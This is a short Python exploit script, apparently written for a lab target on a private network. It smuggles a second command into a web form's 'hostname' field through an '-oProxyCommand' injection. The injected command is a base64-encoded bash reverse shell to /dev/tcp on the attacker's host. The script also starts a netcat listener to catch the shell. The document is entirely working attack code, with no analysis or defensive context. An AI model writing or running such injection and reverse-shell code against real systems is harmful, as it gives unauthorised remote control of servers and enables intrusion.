import requests
import base64
import threading
import os
import time
#LPORT=input("LPORT:")
#RHOST=input("RHOST:")
#RPORT=input("RPORT:")
LHOST="192.168.41.8"
LPORT="8888"
#proxies ={"http":"http://127.0.0.1:8080"}
header={"Content-Type": "application/x-www-form-urlencoded"}

def senddata():
    basecmd=base64.b64encode(f"/bin/bash >& /dev/tcp/{LHOST}/{LPORT} 0>&1".encode())
    cmd=basecmd.decode()
    cmd=cmd.replace("+","%2b").replace("=","%3d")
    data="hostname=x+-oProxyCommand%3decho%09"+cmd+"|base64%09-d|bash}&username=111&password=222"
    res=requests.post(url="http://192.168.41.6:8080/",data=data,headers=header)
    print("sending data:"+data)


def startnc():
    os.system(f"nc -lvp {LPORT}")


t=threading.Thread(target=startnc)
t.start()
time.sleep(5)
t=threading.Thread(target=senddata)
t.start()
